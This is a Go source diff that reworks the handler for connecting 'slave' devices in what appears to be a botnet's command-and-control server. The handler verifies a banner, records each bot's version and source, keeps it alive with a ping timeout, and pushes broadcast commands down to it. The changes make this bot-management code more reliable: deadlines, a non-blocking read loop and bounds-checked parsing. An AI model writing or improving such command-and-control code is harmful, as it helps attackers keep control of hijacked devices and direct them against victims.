@@ -6,7 +6,8 @@ import (
 	"time"
 )
 
-// Slave will start the main slave process
+const pingTimeout = 90 * time.Second
+
 func Slave() error {
 	listener, err := net.Listen(Options.Templates.Slaves.Protocol, Options.Templates.Slaves.Listener)
 	if err != nil {
@@ -33,81 +34,72 @@ type Client struct {
 	Stream  chan []byte
 }
 
-// Handle will handle the new possible device connection.
 func Handle(conn net.Conn) {
 	defer conn.Close()
 
-	time.Sleep(1 * time.Second)
+	conn.SetDeadline(time.Now().Add(10 * time.Second))
+
 	buffer := make([]byte, 32)
 	i, err := conn.Read(buffer)
 	if err != nil || i > len(buffer) {
 		return
 	}
 
-	// Ranges through each block verifying its data
 	for pos, block := range Banner {
 		if buffer[pos] != block {
 			return
 		}
 	}
 
+	versionIdx := len(Banner)
+	sourceIdx := len(Banner) + 1
+
 	var New *Client = &Client{
 		Conn:    conn,
 		Stream:  make(chan []byte),
 		Source:  "unknown",
-		Version: buffer[len(Banner)+1],
+		Version: buffer[versionIdx],
 	}
 
-	// Checks for a certain block name
-	if buffer[len(Banner)+1] > 0 {
-		New.Source = string(buffer[len(Banner)+1:])
+	if sourceIdx < i {
+		src := string(buffer[sourceIdx:i])
+		if len(src) > 0 {
+			New.Source = src
+		}
 	}
 
 	AddClient(New)
 	defer RemoveClient(New)
-	ticker := time.NewTicker(time.Second)
-	cancel := make(chan bool)
-	conns := 0
+
+	type readResult struct {
+		buf []byte
+		err error
+	}
 
 	for {
+		conn.SetDeadline(time.Now().Add(pingTimeout))
+
+		readCh := make(chan readResult, 1)
+		go func() {
+			buf := make([]byte, 2)
+			_, err := conn.Read(buf)
+			readCh <- readResult{buf, err}
+		}()
+
 		select {
-		case n := <-cancel: // Cancel is triggered when the device connection is closed.
-			if !n {
-				continue
+		case res := <-readCh:
+			if res.err != nil {
+				return
 			}
 
-			return
+		case broadcast := <-New.Stream:
+			conn.SetDeadline(time.Now())
+			<-readCh
+			conn.SetDeadline(time.Now().Add(pingTimeout))
 
-		case <-ticker.C: // New Check alive command
-			conn.SetReadDeadline(time.Now().Add(120 * time.Second))
-			if conns > 0 {
-				continue
-			}
-
-			go func(conn net.Conn) {
-				conns++
-				defer func() {
-					conns--
-				}()
-
-				buf := make([]byte, 1)
-				conn.SetReadDeadline(time.Now().Add(180 * time.Second))
-				if _, err := conn.Read(buf); err != nil {
-					cancel <- true
-					return
-				}
-				conn.SetReadDeadline(time.Now().Add(120 * time.Second))
-				if _, err := conn.Write(buf); err != nil {
-					cancel <- true
-					return
-				}
-			}(conn)
-
-		case broadcast := <-New.Stream: // Send command
 			if _, err := conn.Write(broadcast); err != nil {
 				return
 			}
 		}
 	}
-
 }
